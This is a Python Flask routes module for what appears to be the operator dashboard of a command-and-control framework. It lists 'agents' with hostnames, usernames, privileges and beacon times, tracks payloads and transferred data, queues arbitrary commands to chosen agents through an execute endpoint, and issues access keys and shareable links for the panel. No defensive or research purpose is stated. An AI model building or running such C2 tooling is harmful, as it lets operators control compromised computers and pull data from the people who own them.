#!/usr/bin/env python3
"""
New Dashboard Routes - Modern Dashboard with Real Data
Provides API endpoints for the new dashboard interface
"""

import os
import sys
import json
import logging
from datetime import datetime, timedelta
from flask import Blueprint, render_template, request, jsonify, session
from functools import wraps

# Add current directory to path
sys.path.insert(0, os.path.dirname(__file__))

from dashboard_data_provider import DashboardDataProvider
from access_key_manager import AccessKeyManager

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Create blueprint
new_dashboard_bp = Blueprint('new_dashboard', __name__, url_prefix='/dashboard')

# Initialize data provider
data_provider = DashboardDataProvider()
access_key_manager = AccessKeyManager()


def auth_required(f):
    """Decorator to require authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('authenticated'):
            return jsonify({'error': 'Authentication required'}), 401
        return f(*args, **kwargs)
    return decorated_function


@new_dashboard_bp.route('/')
@auth_required
def dashboard():
    """Render dashboard page"""
    return render_template('new_dashboard.html')


@new_dashboard_bp.route('/api/stats')
@auth_required
def get_stats():
    """Get dashboard statistics"""
    try:
        stats = data_provider.get_dashboard_stats()
        return jsonify({
            'active_agents': stats.active_agents,
            'total_payloads': stats.total_payloads,
            'commands_executed_24h': stats.commands_24h,
            'data_transferred_24h_mb': stats.data_transferred_mb
        })
    except Exception as e:
        logger.error(f"Error getting stats: {e}")
        return jsonify({'error': str(e)}), 500


@new_dashboard_bp.route('/api/agents')
@auth_required
def get_agents():
    """Get list of agents"""
    try:
        agents = data_provider.get_agents()
        return jsonify([{
            'id': agent.id,
            'hostname': agent.hostname,
            'username': agent.username,
            'ip_address': agent.ip_address,
            'platform': agent.platform,
            'architecture': agent.architecture,
            'privileges': agent.privileges,
            'first_seen': agent.first_seen,
            'last_seen': agent.last_seen,
            'last_beacon': agent.last_beacon,
            'status': agent.status,
            'notes': agent.notes,
            'metadata': agent.metadata
        } for agent in agents])
    except Exception as e:
        logger.error(f"Error getting agents: {e}")
        return jsonify({'error': str(e)}), 500


@new_dashboard_bp.route('/api/agent/<agent_id>')
@auth_required
def get_agent(agent_id):
    """Get specific agent details"""
    try:
        agent = data_provider.get_agent(agent_id)
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        
        return jsonify({
            'id': agent.id,
            'hostname': agent.hostname,
            'username': agent.username,
            'ip_address': agent.ip_address,
            'platform': agent.platform,
            'architecture': agent.architecture,
            'privileges': agent.privileges,
            'first_seen': agent.first_seen,
            'last_seen': agent.last_seen,
            'last_beacon': agent.last_beacon,
            'status': agent.status,
            'notes': agent.notes,
            'metadata': agent.metadata
        })
    except Exception as e:
        logger.error(f"Error getting agent {agent_id}: {e}")
        return jsonify({'error': str(e)}), 500


@new_dashboard_bp.route('/api/commands')
@auth_required
def get_commands():
    """Get list of commands"""
    try:
        limit = request.args.get('limit', 50, type=int)
        agent_id = request.args.get('agent_id')
        
        commands = data_provider.get_commands(limit=limit, agent_id=agent_id)
        return jsonify([{
            'id': cmd.id,
            'agent_id': cmd.agent_id,
            'command': cmd.command,
            'status': cmd.status,
            'created_at': cmd.created_at,
            'executed_at': cmd.executed_at,
            'completed_at': cmd.completed_at,
            'retry_count': cmd.retry_count,
            'priority': cmd.priority
        } for cmd in commands])
    except Exception as e:
        logger.error(f"Error getting commands: {e}")
        return jsonify({'error': str(e)}), 500


@new_dashboard_bp.route('/api/execute', methods=['POST'])
@auth_required
def execute_command():
    """Execute command on agent"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        command = data.get('command')
        
        if not agent_id or not command:
            return jsonify({'error': 'agent_id and command are required'}), 400
        
        # Verify agent exists
        agent = data_provider.get_agent(agent_id)
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        
        # Queue command
        command_id = data_provider.queue_command(agent_id, command)
        
        return jsonify({
            'success': True,
            'command_id': command_id,
            'message': f'Command queued for agent {agent_id}'
        })
    except Exception as e:
        logger.error(f"Error executing command: {e}")
        return jsonify({'error': str(e)}), 500


@new_dashboard_bp.route('/api/command/<int:command_id>')
@auth_required
def get_command(command_id):
    """Get command details"""
    try:
        command = data_provider.get_command(command_id)
        if not command:
            return jsonify({'error': 'Command not found'}), 404
        
        return jsonify({
            'id': command.id,
            'agent_id': command.agent_id,
            'command': command.command,
            'status': command.status,
            'created_at': command.created_at,
            'executed_at': command.executed_at,
            'completed_at': command.completed_at,
            'retry_count': command.retry_count,
            'priority': command.priority
        })
    except Exception as e:
        logger.error(f"Error getting command {command_id}: {e}")
        return jsonify({'error': str(e)}), 500


@new_dashboard_bp.route('/api/activity')
@auth_required
def get_activity():
    """Get recent activity"""
    try:
        limit = request.args.get('limit', 20, type=int)
        activity = data_provider.get_recent_activity(limit=limit)
        return jsonify(activity)
    except Exception as e:
        logger.error(f"Error getting activity: {e}")
        return jsonify({'error': str(e)}), 500


# Admin routes for access key management
@new_dashboard_bp.route('/admin/keys')
@auth_required
def admin_keys():
    """Render admin keys page"""
    # Check if user has admin permissions
    if 'admin' not in session.get('permissions', []):
        return jsonify({'error': 'Admin access required'}), 403
    
    return render_template('admin_keys.html')


@new_dashboard_bp.route('/api/admin/keys')
@auth_required
def list_keys():
    """List all access keys (admin only)"""
    if 'admin' not in session.get('permissions', []):
        return jsonify({'error': 'Admin access required'}), 403
    
    try:
        keys = access_key_manager.list_keys()
        return jsonify([{
            'id': key['id'],
            'name': key['name'],
            'permissions': key['permissions'],
            'created_at': key['created_at'],
            'last_used': key['last_used'],
            'expires_at': key['expires_at'],
            'is_active': key['is_active'],
            'usage_count': key['usage_count'],
            'usage_limit': key['usage_limit']
        } for key in keys])
    except Exception as e:
        logger.error(f"Error listing keys: {e}")
        return jsonify({'error': str(e)}), 500


@new_dashboard_bp.route('/api/admin/keys', methods=['POST'])
@auth_required
def create_key():
    """Create new access key (admin only)"""
    if 'admin' not in session.get('permissions', []):
        return jsonify({'error': 'Admin access required'}), 403
    
    try:
        data = request.get_json()
        name = data.get('name')
        permissions = data.get('permissions', ['read'])
        expires_at = data.get('expires_at')
        ip_whitelist = data.get('ip_whitelist')
        usage_limit = data.get('usage_limit')
        
        if not name:
            return jsonify({'error': 'Name is required'}), 400
        
        # Parse expiration date if provided
        expires_datetime = None
        if expires_at:
            try:
                expires_datetime = datetime.fromisoformat(expires_at)
            except ValueError:
                return jsonify({'error': 'Invalid expiration date format'}), 400
        
        # Generate key
        key, key_id = access_key_manager.generate_key(
            name=name,
            permissions=permissions,
            expires_at=expires_datetime,
            ip_whitelist=ip_whitelist,
            usage_limit=usage_limit
        )
        
        return jsonify({
            'success': True,
            'key': key,
            'key_id': key_id,
            'message': 'Access key created successfully. Save this key - it will not be shown again!'
        })
    except Exception as e:
        logger.error(f"Error creating key: {e}")
        return jsonify({'error': str(e)}), 500


@new_dashboard_bp.route('/api/admin/keys/<int:key_id>', methods=['DELETE'])
@auth_required
def revoke_key(key_id):
    """Revoke access key (admin only)"""
    if 'admin' not in session.get('permissions', []):
        return jsonify({'error': 'Admin access required'}), 403
    
    try:
        success = access_key_manager.revoke_key(key_id)
        if success:
            return jsonify({
                'success': True,
                'message': 'Access key revoked successfully'
            })
        else:
            return jsonify({'error': 'Key not found'}), 404
    except Exception as e:
        logger.error(f"Error revoking key {key_id}: {e}")
        return jsonify({'error': str(e)}), 500


@new_dashboard_bp.route('/api/admin/links', methods=['POST'])
@auth_required
def generate_link():
    """Generate shareable access link (admin only)"""
    if 'admin' not in session.get('permissions', []):
        return jsonify({'error': 'Admin access required'}), 403
    
    try:
        data = request.get_json()
        expires_in = data.get('expires_in', 3600)  # Default 1 hour
        permissions = data.get('permissions', ['read'])
        
        link = access_key_manager.generate_access_link(
            expires_in=expires_in,
            permissions=permissions
        )
        
        return jsonify({
            'success': True,
            'link': link,
            'expires_in': expires_in,
            'message': 'Access link generated successfully'
        })
    except Exception as e:
        logger.error(f"Error generating link: {e}")
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    print("New Dashboard Routes Module")
    print("Import this module in your main Flask app")
